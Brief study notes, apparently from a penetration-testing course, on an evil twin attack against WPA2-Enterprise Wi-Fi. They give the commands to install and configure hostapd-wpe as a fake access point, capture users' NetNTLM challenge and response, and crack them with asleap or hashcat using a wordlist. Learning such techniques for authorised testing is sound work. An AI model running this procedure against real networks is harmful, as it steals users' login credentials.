- all users will have their own user/pass
- authentication is managed through a radius server
- How to attack
	- evil twin attack

# Use modified hostapd to spin up a wpa2 enterprise fake AP
- the only issue is that any password captured will be encrypted and you will need to use hashcat and attempt to crack them

## install:
- apt-get update
- apt-get install hostapd-wpe

## Modify default config file
- leafpad /etc/hostapd-wpe/hostapd-wpe.conf
   - update interface name
   - modify ssid
   - ctrl s ctrl q

## setup attack
- service NetworkManager stop

## run attack:
- hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
- After user enters credentials we will have all we need to crack password
   - what we get is an netntlm hash

## Crack password
- you can use hashcat or asleap
- to use esleap
   - asleap -C a5:5e:3a:f5:4b:d8:db:ff -R [some really long text goes here] -W rockyou.txt
      - 1- C is the challenge
      - 2- -R is the response 

